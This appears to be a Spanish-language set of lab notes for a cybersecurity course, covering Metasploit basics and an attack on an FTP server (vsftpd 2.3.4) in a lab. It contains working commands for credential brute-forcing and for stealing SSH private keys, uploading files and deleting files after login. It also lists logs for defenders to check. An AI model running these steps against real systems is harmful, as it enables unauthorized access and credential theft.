# Metasploit

> [!NOTE]
> [YT @VulnHunters: Curso Ciberseguridad Desde Cero 2025 (2:14)](https://www.youtube.com/watch?v=y9NhaYH-FV8&t=8835s)

> [!TIP]
> [/kali_lab/metasploit/](/kali_lab/metasploit/)

## 101

```sh
sudo msfdb status
sudo msfdb init
sudo msfdb status
# ---
sudo msfdb status
sudo msfdb start
sudo msfdb status
```

```sh
# Iniciar consola y ver opciones
sudo msfconsole # || msfconsole
{
help

# ---

# Listar y crear workspaces
workspace -l
# workspace -h
workspace -a test
# workspace -l

# ---

# Buscar y usar módulos
search portscan
use auxiliary/scanner/portscan/tcp

# ---

# Ver opciones, configurar y usar el módulo seleccionado
options
set RHOSTS 172.26.10.12
options

# ---

# Consultar info de los objetivos (según workspace)
hosts
services
  # NOTE: posible integración desde nmap, nexus, etc.
# vulns

# ---

# Salir de la consola (info queda guardada en la DB)
exit
}
```


## FTP

- enumerar servicio ftp con nmap

```sh
nmap server.local

nmap -p21 -sV server.local
  # 21/tcp open  ftp     vsftpd 2.3.4

# -----------------------------------------------------
ls -l /usr/share/nmap/scripts/ftp-*
  # /usr/share/nmap/scripts/ftp-anon.nse
  # /usr/share/nmap/scripts/ftp-bounce.nse
  # /usr/share/nmap/scripts/ftp-brute.nse
  # /usr/share/nmap/scripts/ftp-libopie.nse
  # /usr/share/nmap/scripts/ftp-proftpd-backdoor.nse
  # /usr/share/nmap/scripts/ftp-syst.nse
  # /usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse
  # /usr/share/nmap/scripts/ftp-vuln-cve2010-4221.nse
# -----------------------------------------------------

# nmap -p21 -sV --script ftp-anon server.local -v
nmap -p21 -sV -sC server.local -v
  # PORT   STATE SERVICE VERSION
  # 21/tcp open  ftp     vsftpd 2.3.4
  # |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
  # | ftp-syst:
  # |   STAT:
  # | FTP server status:
  # |      Connected to 172.26.10.11
  # |      Logged in as ftp
  # |      TYPE: ASCII
  # |      No session bandwidth limit
  # |      Session timeout in seconds is 300
  # |      Control connection is plain text
  # |      Data connections will be plain text
  # |      vsFTPd 2.3.4 - secure, fast, stable
  # |_End of status
  # MAC Address: 08:00:27:47:2A:01 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
  # Service Info: OS: Unix
```

- enumerar con metasploit

```sh
# sudo msfconsole

workspace -a ftp

# ---

# Comprobar versión del servicio
use auxiliary/scanner/ftp/ftp_version

options
set RHOSTS 172.26.10.12

run
services

# ---

# Comprobar login anónimo
use auxiliary/scanner/ftp/anonymous

options
set RHOSTS 172.26.10.12 # tab para autocompletar

run
services
```

- fuerza bruta con nmap

```sh
nmap -p21 -sV --script ftp-brute server.local -v # ~10 min
  # PORT   STATE SERVICE VERSION
  # 21/tcp open  ftp     vsftpd 2.3.4
  # | ftp-brute:
  # |   Accounts:
  # |     user:user - Valid credentials
  # |_  Statistics: Performed 3886 guesses in 600 seconds, average tps: 6.2
```

- fuerza bruta con metasploit

```sh
# sudo msfconsole

ls /usr/share/metasploit-framework/data/wordlists/
  # ...

use auxiliary/scanner/ftp/ftp_login

options

set RHOSTS 172.26.10.12
set USERPASS_FILE /lab/metasploit/common_userpass.txt

run

# ---

creds
```

- conexión al servicio

```sh
ftp -inv server.local <<EOF
user anonymous anonymous
ls -a
EOF

ftp server.local
  # login: anonymous:anonymous
{
help

pwd
ls -a
}

ftp server.local
  # login: user:user
{
pwd
ls -a

put test.txt  # subir fichero malicioso !!!!!!!!
delete test.txt # eliminar ficheros remotos !!!!!!!!

cd .ssh
get id_dsa data/id_dsa  # descargar claves ssh !!!!!!!!
get id_dsa.pub data/id_dsa.pub

quit
}
```


- **BLUE TEAM**

```sh
# vagrant ssh debian-soc-vagrant-vm
# sudo docker exec -it metasploitable2 bash

cat /var/log/vsftpd.log
cat /var/log/proftpd/proftpd.log
cat /var/log/syslog
cat /var/log/auth.log
```


## SSH
